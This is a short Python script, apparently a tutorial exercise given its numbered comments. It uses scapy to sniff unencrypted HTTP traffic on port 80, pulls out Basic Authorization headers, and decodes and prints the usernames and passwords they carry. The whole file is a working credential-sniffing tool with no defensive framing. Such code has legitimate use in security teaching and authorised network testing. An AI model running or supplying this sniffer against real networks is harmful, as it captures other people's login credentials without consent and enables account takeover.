from scapy.all import *
import re, base64

pattern = re.compile(r"Authorization: Basic (.+)") #1

def packet_callback(packet):
    if packet[TCP].payload:
        payload = str(packet[TCP].payload)
        match = re.search(pattern, payload) #2
        if match: #3
            print base64.b64decode(match.group(1)) #4
            print "*" * 10

sniff(filter="tcp port 80",prn=packet_callback,store=0)